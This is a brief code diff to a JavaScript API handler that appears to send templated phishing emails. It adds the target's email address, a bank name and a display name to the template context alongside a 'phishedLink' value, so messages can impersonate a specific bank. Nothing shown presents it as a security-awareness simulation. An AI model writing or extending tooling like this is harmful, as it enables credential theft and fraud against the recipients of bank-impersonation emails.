@@ -75,7 +75,9 @@ export default async function handler(req, res) {
         context: {
           text: req.body.html,
           datetime: newDate.toUTCString(),
-          targetName: req.body.targetName,
+          email: req.body.to,
+          bodyName:req.body.bodyName,
+          bank:req.body.bankName,
           phishedLink: phishedLink
         },
       };
@@ -99,5 +101,6 @@ export default async function handler(req, res) {
     default:
       res.setHeader('Allow', ['POST'])
       res.status(405).end(`Method ${method} Not Allowed`)
+
   }
 }
